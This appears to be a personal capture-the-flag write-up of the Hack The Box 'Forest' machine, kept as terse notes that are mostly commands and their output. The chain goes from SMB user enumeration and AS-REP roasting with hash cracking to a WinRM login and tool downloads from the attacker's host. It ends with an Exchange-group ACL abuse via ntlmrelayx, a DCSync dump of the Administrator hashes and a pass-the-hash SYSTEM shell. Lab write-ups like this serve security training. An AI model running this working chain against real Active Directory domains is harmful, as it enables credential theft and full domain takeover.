 


119
Got domain name from smb.

https://seuforia.wordpress.com/2018/09/19/do-not-require-kerberos-pre-authentication-for-users-create-by-ambari-on-ad/


```
 crackmapexec smb 10.10.10.161 --users |tee smb.users
 
cat smb.users|awk -F" " '{print$5}'|grep htb|sed 's/htb.local\\/\n/'> users.txt



┌──(kali㉿kali)-[~/HTB/Forest]
└─$ cat users.txt|grep -v root |grep -v Health* |grep -v SM* > valid_users.txt 


──(kali㉿kali)-[~/HTB/Forest]
└─$ cat valid_users.txt  
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
sebastien
lucinda
svc-alfresco
andy
mark
santi



```
getting kerberos ticket
https://seuforia.wordpress.com/2018/09/19/do-not-require-kerberos-pre-authentication-for-users-create-by-ambari-on-ad/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
https://medium.com/r3d-buck3t/kerberos-attacks-as-rep-roasting-2549fd757b5

```
└─$ impacket-GetNPUsers  htb/ -dc-ip 10.10.10.161 -usersfile ./valid_users.txt -request -format john -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB:973f4a4fa9f5bd1f541da70005b0685e$9fb58fb298bd7ea3730d280adbd6c29267871d358312115fd7a6c13b751b86240682c8c376de6dbfe0b4900aee322bfa65c85b142211a8d687d481c5627b0dd6b1ef3a42851120c8f36c21dd5ea06b038ea39100b67d25e5b51ae39a729d01bf2e84840d183dbaa8706a20a8040d5e2a23e2bdae4fa89f6b5e30c6986b605fa89babd39c96c2a6a532c26114e020d8fe2df9a3d0160a94b958fd01589931ff4dd3ab2d8b91ad2238d2c7953891129b4972e900df8a376f8dc3f3e6a509d2cee854259b60959bbfb724978577d562e8b989123cf1d544a963f76eb919146c1a2c
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

```

Cracking with john.

```
┌──(kali㉿kali)-[~/HTB/Forest]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ticket.tick 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB)     
1g 0:00:00:03 DONE (2022-12-01 16:33) 0.2958g/s 1208Kp/s 1208Kc/s 1208KC/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

OR

with hashcat

┌──(kali㉿kali)-[~/HTB/Forest]
└─$ hashcat -m 18200 -a 0 ./ticket.tick /usr/share/wordlists/rockyou.txt

$krb5asrep$svc-alfresco@HTB:5b8752295d87be6d3650183a6c77b00e$482c13d29de70557494907cddfcf3a8cae76ca81d3f38f2dfb814ed68f6907761d62c01ad78146f1727f26b21eb08c78492e940fa39f241aaca7b75f734bd9a2022500b6779fd5388b656845c4305f7a60f249baaf2fd7d4f474a2df93f5088ebd03427b9bffabd37cafba6396a3fed34f37627f491b4f26f6db3333ce4518b90bcd8f04013afe3e4edd5771ae189a81ba5c6311ddc288df15e1b7974f0ff86797c8fdda4d1fb88d2f0ed2fa9c10003123f1e5be72b3e207144884a80dc84d5d29dd711224ea7adc005bbcd30027c0d32cbe9ee6f501e9c580c9e19af814c98a:s3rvice

```

/svc-alfresco:s3rvice
https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm

```

└─$ evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161

OR 
msfconsole

```


Nishang didn't work
https://github.com/samratashok/nishang/tree/master/Shells

Downloading didn't work.

Going with evil-winrm
```
 evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161


wget 10.10.16.9/SharpHound.ps1 -O SharpHound.ps1

wget 10.10.16.9/powerview.ps1 -O powerview.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice



Kali
impacket-smbserver share . -smb2support -username scriptkiddie -password aa

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net use \\10.10.16.9\share /u:scriptkiddie aa


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net use /d \\10.10.16.9\share





```
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups




svc-alfresco --member of--> Service Account --member of --> Privileged IT accounts --Memberof-->Account Operators--WriteDacl--> Enterprise Admins -- Memberof -->Administrator. 


https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators

According to the MS page,
```
Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers.
```





## DCsync attack Escalating Privilges with Exchange
https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf
### DomainGroup
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> get-domaingroup |select Samaccountname
                                                            
samaccountname                                              
--------------                                              
Administrators              
Users                                                       
Guests                      
Print Operators
Backup Operators
Replicator           
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users                                       
IIS_IUSRS               
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators 
Domain Computers          
Domain Controllers          
Schema Admins               
Enterprise Admins    
Cert Publishers     
Domain Admins   
Domain Users          
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators                                                                                                        
Account Operators
Pre-Windows 2000 Compatible Access
Incoming Forest Trust Builders 
Windows Authorization Access Grou
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers                                
Protected Users           
Key Admins                  
Enterprise Key Admins       
DnsAdmins            
DnsUpdateProxy      
Organization Management
Recipient Management  
View-Only Organization Management
Public Folder Management   
UM Management      
Help Desk                                                                                                               
Records Management
Discovery Management                                        
Server Management                                           
Delegated Setup                                             
Hygiene Management                                          
Compliance Management                                       
Security Reader                                             
Security Administrator      
Exchange Servers                                            
Exchange Trusted Subsystem  
Managed Availability Servers
Exchange Windows Permissions
ExchangeLegacyInterop
$D31000-NSEL5BRJ63V7
Service Accounts
Privileged IT Accounts 
test                


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> get-domaingroup |select Samaccountname|findstr Exchange*
Exchange Servers
Exchange Trusted Subsystem
Exchange Windows Permissions
ExchangeLegacyInterop

```
Create a new user and add it to `Exchange Trusted Subsystem` security group. (By default, that group is a member of `Exchange Windows Permissions` security group which has `writeDACL` permission on the domain object of the domain where Exchange was installed.)


```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user scriptkiddie scriptkiddie /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Trusted Subsystem" scriptkiddie /add /domain
The command completed successfully.



Then from my kali screen 1
impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user scriptkiddie


From my kali screen 2
└─$ impacket-psexec forest.htb/scriptkiddie:scriptkiddie@10.10.16.9            



my kali screen 1 will say
┌──(kali㉿kali)-[~/HTB/Forest]                              
└─$ impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user scriptkiddie
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
                                                            
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..    
[*] Protocol Client LDAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.16.9, attacking target ldap://10.10.10.161
[*] Authenticating against ldap://10.10.10.161 as FOREST.HTB/SCRIPTKIDDIE SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User scriptkiddie now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20221203-212806.restore
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!


```


## DC secretdumping
```
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump forest.htb/scriptkiddie:scriptkiddie@10.10.10.161 -just-dc-user administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
[*] Cleaning up... 
                         
```


Root with psexec.py
```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec forest.htb/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file RykCEJQe.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service BDRH on 10.10.10.161.....
[*] Starting service BDRH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```
z




https://stackoverflow.com/questions/32324023/how-to-connect-to-remote-machine-via-winrm-in-python-pywinrm-using-domain-acco

Resource

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a


https://05t3.github.io/posts/Active-Directory-Lab-Setup/





## HTB Pwned page
https://www.hackthebox.com/achievement/machine/288193/212

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb